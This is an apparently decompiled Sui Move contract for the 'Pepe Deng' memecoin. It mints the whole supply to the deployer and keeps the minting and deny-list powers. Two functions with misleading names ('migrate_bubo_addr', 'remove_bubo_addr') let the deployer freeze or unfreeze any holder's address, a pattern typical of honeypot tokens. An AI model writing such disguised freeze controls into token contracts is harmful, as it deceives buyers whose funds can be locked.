module 0x909b7d59e4a36079bda8129e008bac97b8edb7185e1722bbff96668c9a271d38::PEPEDENG {
    struct PEPEDENG has drop {
        dummy_field: bool,
    }

    fun init(arg0: PEPEDENG, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PEPEDENG>(arg0, 6, b"PEPEDENG", b"Pepe Deng", b"Step right up, folks, and feast your eyes on the one and only Pepe Deng! Half Pepe, half MooDeng https://t.me/PepeDengERC20 https://x.com/PepeDengCoin https://PepeDeng.site", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://movepump.com/_next/image?url=https%3A%2F%2Fapi.movepump.com%2Fuploads%2FIMG_20241010_010917_037_b77cfeef56.jpg&w=640&q=75")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PEPEDENG>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<PEPEDENG>>(0x2::coin::mint<PEPEDENG>(&mut v3, 1000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<PEPEDENG>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PEPEDENG>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun migrate_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEPEDENG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PEPEDENG>(arg0, arg1, arg2, arg3);
    }

    public entry fun remove_bubo_addr(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PEPEDENG>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PEPEDENG>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

